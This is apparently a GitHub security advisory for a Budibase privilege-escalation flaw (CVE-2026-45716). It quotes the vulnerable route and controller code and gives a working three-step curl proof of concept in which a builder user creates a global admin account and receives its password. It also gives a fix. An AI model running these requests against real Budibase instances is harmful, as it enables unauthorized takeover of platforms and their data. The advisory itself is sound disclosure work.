# [H] Budibase: Builder-to-Admin Privilege Escalation via onboardUsers Endpoint Without SMTP Configuration

## Summary
Severity: High
Advisory: GHSA-c54j-xp92-wh28
CVE: CVE-2026-45716
CWE: CWE-269
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-18
Source: https://github.com/advisories/GHSA-c54j-xp92-wh28
Type: github-advisory

## Affected
- npm: `@budibase/worker` — affected >=0 <3.38.1

## Details
## Summary

The `POST /api/global/users/onboard` endpoint is protected by `workspaceBuilderOrAdmin` middleware, allowing any user with builder permissions to access it. When SMTP email is not configured (the default for self-hosted Budibase instances), this endpoint bypasses the admin-restricted invite flow and directly creates users via `bulkCreate`, accepting arbitrary `admin` and `builder` role assignments from the request body. A builder-level user can create a new global admin account and receive the generated password in the response, achieving full privilege escalation.

## Details

The vulnerability stems from a mismatch between the authorization level of the `onboardUsers` endpoint and the user-creation capabilities it exposes when SMTP is not configured.

**Route definition** (`packages/worker/src/api/routes/global/users.ts:93-109`):
```typescript
builderOrAdminRoutes  // <-- allows builders, not just admins
  .post(
    "/api/global/users/onboard",
    buildInviteMultipleValidation(),
    controller.onboardUsers
  )
```

Compare with the `invite` and `inviteMultiple` endpoints which are correctly admin-only:
```typescript
adminRoutes  // <-- admin only
  .post("/api/global/users/invite", buildInviteValidation(), controller.invite)
  .post("/api/global/users/multi/invite", buildInviteMultipleValidation(), controller.inviteMultiple)
```

**Controller** (`packages/worker/src/api/controllers/global/users.ts:601-630`):
```typescript
export const onboardUsers = async (ctx) => {
  if (await isEmailConfigured()) {
    await inviteMultiple(ctx)  // admin-only path (delegates to invite flow)
    return
  }

  // No SMTP → directly create users with attacker-controlled roles
  const users = ctx.request.body.map(invite => {
    const password = generatePassword(12)
    createdPasswords[invite.email] = password
    return {
      email: invite.email,
      password,
      forceResetPassword: true,
      roles: invite.userInfo.apps || {},
      admin: { global: !!invite.userInfo.admin },  // <-- attacker-controlled
      builder: invite.userInfo.builder,              // <-- attacker-controlled
      tenantId: tenancy.getTenantId(),
    }
  })

  let resp = await userSdk.db.bulkCreate(users)
  for (const user of resp.successful) {
    user.password = createdPasswords[user.email]  // <-- password returned!
  }
  ctx.body = { ...resp, created: true }
}
```

**Middleware pass-through** (`packages/backend-core/src/middleware/workspaceBuilderOrAdmin.ts:10-26`):

In the worker context (`env.isWorker()` is `true`), when there is no `workspaceId` parameter in the request (which there isn't for the onboard endpoint), the middleware at line 19 checks `!workspaceId && env.isWorker()` — this is `true`, so it falls through to line 21 which only checks `hasBuilderPermissions`. Any global builder passes.

**Validation gap** (`buildInviteMultipleValidation` at line 37-45): The Joi schema validates `userInfo` as `Joi.object().optional()` with no constraints on its contents, so `admin` and `builder` fields pass through.

**No downstream check**: `bulkCreate` and `buildUser` do not strip or validate admin/builder fields — they are written directly to the user document in CouchDB.

## PoC

**Prerequisites:** A self-hosted Budibase instance (default: no SMTP configured) and a user account with builder-level access.

**Step 1:** Authenticate as a builder user and obtain the session cookie:
```bash
# Login as builder
curl -s -c cookies.txt -X POST 'http://localhost:10000/api/global/auth/default/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"builder@example.com","password":"builderpassword"}'
```

**Step 2:** Create a new global admin user via the onboard endpoint:
```bash
curl -s -X POST 'http://localhost:10000/api/global/users/onboard' \
  -H 'Content-Type: application/json' \
  -b cookies.txt \
  -d '[{"email":"pwned-admin@attacker.com","userInfo":{"admin":{"global":true}}}]'
```

**Expected response** (includes the generated password):
```json
{
  "successful": [{"email":"pwned-admin@attacker.com","password":"<generated-12-char-password>","admin":{"global":true},...}],
  "unsuccessful": [],
  "created": true
}
```

**Step 3:** Login as the new admin:
```bash
curl -s -X POST 'http://localhost:10000/api/global/auth/default/login' \
  -H 'Content-Type: application/json' \
  -d '{"username":"pwned-admin@attacker.com","password":"<password-from-step-2>"}'
```

The attacker now has full global admin access.

## Impact

- **Privilege escalation:** Any builder-level user can escalate to global admin on self-hosted Budibase instances without SMTP configured (the default deployment).
- **Full platform compromise:** Global admin can access all apps, all data sources, manage all users, delete apps, and modify platform configuration.
- **Credential exposure:** The generated password is returned in the HTTP response, giving the attacker immediate access to the new admin account.
- **Stealth:** The created user appears as a legitimately onboarded user, making detection difficult without audit log review.
- **Wide applicability:** Self-hosted Budibase instances commonly run without SMTP configuration, making this the default-exploitable path.

## Recommended Fix

Move the `onboardUsers` route from `builderOrAdminRoutes` to `adminRoutes` to match the authorization level of `invite` and `inviteMultiple`:

```diff
--- a/packages/worker/src/api/routes/global/users.ts
+++ b/packages/worker/src/api/routes/global/users.ts
-builderOrAdminRoutes
+adminRoutes
   .post(
     "/api/global/users/onboard",
     buildInviteMultipleValidation(),
     controller.onboardUsers
   )
```

Additionally, the `onboardUsers` controller should validate that the caller has sufficient permissions to assign the requested role level. Even admin users should not be able to create users with roles exceeding their own. Consider adding explicit validation in the controller:

```typescript
// In onboardUsers, before bulkCreate:
for (const invite of ctx.request.body) {
  if (invite.userInfo.admin && !ctx.user.admin?.global) {
    ctx.throw(403, "Only admins can create admin users")
  }
}
```

## References
- https://github.com/Budibase/budibase/security/advisories/GHSA-c54j-xp92-wh28
- https://nvd.nist.gov/vuln/detail/CVE-2026-45716
- https://github.com/Budibase/budibase
- https://github.com/Budibase/budibase/releases/tag/3.38.1
